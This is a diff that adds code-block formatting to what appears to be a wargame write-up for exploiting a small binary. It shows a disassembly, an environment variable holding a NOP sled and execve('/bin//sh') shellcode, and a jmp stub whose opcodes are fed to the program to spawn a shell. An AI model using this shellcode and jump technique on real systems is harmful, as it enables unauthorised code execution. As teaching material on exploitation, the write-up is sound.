@@ -1,5 +1,6 @@
 
 Dump of assembler code for function main:
+```assembly
    0x0804841b <+0>:	push   ebp
    0x0804841c <+1>:	mov    ebp,esp
    0x0804841e <+3>:	sub    esp,0xc
@@ -24,18 +25,22 @@ Dump of assembler code for function main:
    0x08048455 <+58>:	leave  
 ---Type <return> to continue, or q <return> to quit---
    0x08048456 <+59>:	ret    
+```
 End of assembler dump.
 
 as you can see, we can execute 8 bytes of our choice, though not long enough for shellcode, we might still
 be able to use jmp or call...
 
 we lay the ground:
+```sh
 export EGG
 EGG=$(python -c 'print "\x90"*100+"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"')
+```
 
 address of shell code: 0xffffde68
 
 assembly code of jmp to address:
+```assembly
 section .data
 
 section .text
@@ -45,6 +50,7 @@ _start:
         jmp 0xffffde68
 
 section .rodata
+```
 
 we compile and get the opcodes, we get:
 r $(python -c 'print "\xe9\x64\xde\xff\xff"')
